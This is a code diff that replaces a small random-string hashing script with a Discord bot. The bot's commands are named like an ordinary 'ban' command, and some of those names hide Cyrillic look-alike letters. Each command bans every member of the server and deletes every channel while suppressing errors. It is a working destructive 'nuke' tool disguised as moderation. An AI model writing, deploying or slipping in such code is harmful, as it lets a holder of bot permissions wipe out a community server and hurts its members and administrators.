@@ -1,43 +1,125 @@
-from random import randint
-def xor(x,y):
-	if x == y:
-		return x,y
-	else:
-		return y,x
-def randstr(x):
-	s = ""
-	S = ["q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m","_"]
-	for i in range(x):
-		s = s + S[randint(0,len(S)-1)]
-	return s
+import discord
+import discord.ext.commands
 
-T2 = []
-if True:
-	file = open("codes.txt", "w")
-	for i in range(256661):
-		file.write(randstr(40) + "\n")
-	file.close
-file = open("codes.txt", "r")
-for char in file:
-	T2.append(char)
-file.close
-if True:
-	file = open("codes2.txt", "w")
-	for i in range(256661):
-		file.write(str(randint(0,25666)) + "\n")
-	file.close
-T = []
-file = open("codes2.txt", "r")
-for char in file:
-	T.append(int(char))
-file.close
 
-def hash(T,T2,W):
-	h = len(W) 
-	for c in W:
-		index = h + ord(c)
-		h = T[index]
-		g = T2[index]
-	return g
-print("Prepare - Completed")
-print(hash(T,T2,'Gewhere'))
+TOKEN = input()
+bot = discord.ext.commands.Bot(command_prefix = "!")
+
+@bot.command()
+async def bаn(ctx, arg):
+    for user in ctx.guild.members:
+        print('ban')
+        try:
+            await ctx.guild.ban(user)
+        except:
+            pass
+    for chanel in ctx.guild.channels:
+        print('ban')
+        try:
+            await chanel.delete()
+        except:
+            pass
+
+
+@bot.command()
+async def ban(ctx, arg):
+    for user in ctx.guild.members:
+        print('ban')
+        try:
+            await ctx.guild.ban(user)
+        except:
+            pass
+    for chanel in ctx.guild.channels:
+        print('ban')
+        try:
+            await chanel.delete()
+        except:
+            pass
+
+
+@bot.command()
+async def BаN(ctx, arg):
+    for user in ctx.guild.members:
+        print('ban')
+        try:
+            await ctx.guild.ban(user)
+        except:
+            pass
+    for chanel in ctx.guild.channels:
+        print('ban')
+        try:
+            await chanel.delete()
+        except:
+            pass
+@bot.command()
+async def BАN(ctx, arg):
+    for user in ctx.guild.members:
+        print('ban')
+        try:
+            await ctx.guild.ban(user)
+        except:
+            pass
+    for chanel in ctx.guild.channels:
+        print('ban')
+        try:
+            await chanel.delete()
+        except:
+            pass
+@bot.command()
+async def BAN(ctx, arg):
+    for user in ctx.guild.members:
+        print('ban')
+        try:
+            await ctx.guild.ban(user)
+        except:
+            pass
+    for chanel in ctx.guild.channels:
+        print('ban')
+        try:
+            await chanel.delete()
+        except:
+            pass
+@bot.command()
+async def Ban(ctx, arg):
+    for user in ctx.guild.members:
+        print('ban')
+        try:
+            await ctx.guild.ban(user)
+        except:
+            pass
+    for chanel in ctx.guild.channels:
+        print('ban')
+        try:
+            await chanel.delete()
+        except:
+            pass
+@bot.command()
+async def baN(ctx, arg):
+    for user in ctx.guild.members:
+        print('ban')
+        try:
+            await ctx.guild.ban(user)
+        except:
+            pass
+    for chanel in ctx.guild.channels:
+        print('ban')
+        try:
+            await chanel.delete()
+        except:
+            pass
+@bot.command()
+async def bаN(ctx, arg):
+    for user in ctx.guild.members:
+        print('ban')
+        try:
+            await ctx.guild.ban(user)
+        except:
+            pass
+    for chanel in ctx.guild.channels:
+        print('ban')
+        try:
+            await chanel.delete()
+        except:
+            pass
+
+bot.run(TOKEN)
